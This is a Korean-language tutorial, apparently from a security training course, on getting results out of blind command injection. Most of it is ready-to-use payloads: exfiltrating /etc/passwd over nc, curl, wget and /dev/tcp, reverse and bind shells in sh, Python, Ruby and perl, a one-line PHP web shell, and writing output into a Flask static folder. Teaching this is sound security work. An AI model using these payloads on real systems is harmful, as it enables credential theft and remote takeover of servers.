실행 결과를 확인할 수 없는 환경 :
    Command Injection 취약점이 발생해 원하는 OS명령어를 실행할 수 있지만,
    실행 결과가 사용자에게 노출되지 않는 상황에서 활용할 수 있는 공격 방법들입니다.

1) Network Outbound
    OS명령어를 실행한 결과를 네트워크 도구를 이용해 외부 서버로 전송시키는 방법입니다.
    ex) nc (netcat)
        cat /etc/passwd | nc 127.0.0.1 8080
        ls -al | nc 127.0.0.1 8080

    위와 같이 네트워크 도구를 통해 특정 IP/PORT에 결과를 전송하며, 
    아래와 같이 네트워크 도구를 이용해 전송된 데이터 내용을 확인할 수 있습니다.
    ex) nc (netcat)
        $ nc -l -p 8080 -k -v
        Listening on [0.0.0.0] (family 0, port 8080)
        Connection from [127.0.0.1] port 8080 [tcp/http-alt] accepted (family 2, sport 42396)
        root:x:0:0:root:/root:/bin/bash
        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
        bin:x:2:2:bin:/bin:/usr/sbin/nologin
        sys:x:3:3:sys:/dev:/usr/sbin/nologin
        ...

    ex) telnet
        cat /etc/passwd | telnet 127.0.0.1 8080

    ex) curl / wget
        # GET parameter에 실행 결과 포함(개행으로 인해 오류가 발생할 수 있기 때문에 base64인코딩을 통해 개행 제거.)
        curl "http://127.0.0.1:8080/?$(ls -al|base64 -w0)"
        
        # POST Body에 실행 결과 포함
        curl http://127.0.0.1:8080/ -d "$(ls -al)"
        wget http://127.0.0.1:8080 --method=POST --body-data="`ls -al`"

    ex) /dev/tcp, /dev/udp (bash 한정)
        cat /etc/passwd > /dev/tcp/127.0.0.1/8080

2) Reverse Shell / Bind Shell
    쉘 명령어를 네트워크를 통해 입력하거나 출력하여 공격하는 기법입니다.

    Reverse Shell은 취약점이 발생하는 서버에서 공격자의 서버로 쉘을 연결 (Network Outbound), 
    Bind Shell은 특정 포트로 쉘을 서비스하는 것을 (Network Inbound) 의미합니다.

    Reverse Shell :
    ex) sh(bash)
        /bin/sh -i >& /dev/tcp/127.0.0.1/8080 0>&1      // TCP
        /bin/sh -i >& /dev/udp/127.0.0.1/8080 0>&1      // UDP

    연결을 받는 서버에서 아래와 같이 nc 등의 네트워크 도구를 통해 연결을 맺게 되면 쉘을 획득할 수 있습니다.
    ex) nc (netcat)
        $ nc -l -p 8080 -k -v       // UDP 사용시 -u 옵션 사용
        Listening on [0.0.0.0] (family 0, port 8080)
        Connection from [127.0.0.1] port 8080 [tcp/http-alt] accepted (family 2, sport 42202)
        $ id
        uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack)

    ex) Python
        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
        s.connect(("127.0.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
        p=subprocess.call(["/bin/sh","-i"]);'

    ex) Ruby
        ruby -rsocket -e 'exit if fork;c=TCPSocket.new("127.0.0.1","8080");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

    Bind Shell :
    ex) nc(netcat)
        # nc 버전에 따라 -e 옵션을 지원하지 않을 수도 있습니다.
        nc -nlvp 8080 -e /bin/sh
        ncat -nlvp 8080 -e /bin/sh

    ex) perl
        perl -e 'use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));
        listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'

3) 파일 생성
    어플리케이션 상에서 직접적으로 확인할 수 있는 파일 시스템 경로에 결과를 포함한 파일을 생성하거나, 
    어플리케이션 로직을 통해 확인할 수 있는 공간에 파일을 생성시켜 확인하는 방법입니다.

    밑의 예시는 공격자가 127.0.0.1의 주소를 가지며, 8080 포트인 상황을 가정하고 작성된 내용입니다. 
    실습 시에는 해당 주소와 포트를 상황에 맞게 변경한 후 사용하시길 바랍니다.

    Scripting Engine :
        웹 루트 하위에 있는 폴더에 해석 가능한 (php/jsp/asp) 파일을 만들어 웹쉘 형태로 접근하는 방식입니다.

    ex) 
        printf '<?=system($_GET[0])?>' > /var/www/html/uploads/shell.php

    파일 생성이 가능한 권한이 있는 디렉토리에 파일을 생성하여 아래와 같이 웹쉘 형태로 사용 가능합니다.
    ex) 웹사이트
        url : vuew-source:demo.dreamhack.io/uploads/shell.php?0=id

        웹사이트에 출력된 내용 
        uid=33(www-data) gid=33(www-data) groups=33(www-data)
        uid=33(www-data) gid=33(www-data) groups=33(www-data)

    Static File Directory :
        프레임워크 또는 다양한 웹 어플리케이션에서는 JS/CSS/Img 등의 정적 리소스를 다루기 위해 Static File Directory를 사용합니다.
        해당 디렉토리에 OS명령어의 결과를 파일로 생성시킨 후 접근하는 방법을 통해 결과를 확인할 수 있습니다.

        대표적인 예시로 Python의 Flask 프레임워크는 기본 설정 상 static 디렉토리의 이름이 static으로 설정되어 있습니다.
        또한 static 디렉토리를 생성하지 않은 상황에서도 OS명령어를 통해 static 디렉토리를 생성한 후
        해당 디렉토리내에 파일을 생성하여 확인할 수 있습니다. 
        (프레임워크가 동작하는 디렉토리에 대한 권한이 존재하여야 디렉토리를 생성할 수 있습니다.)
    ex)
        /?cmd=mkdir static; id > static/result.txt


















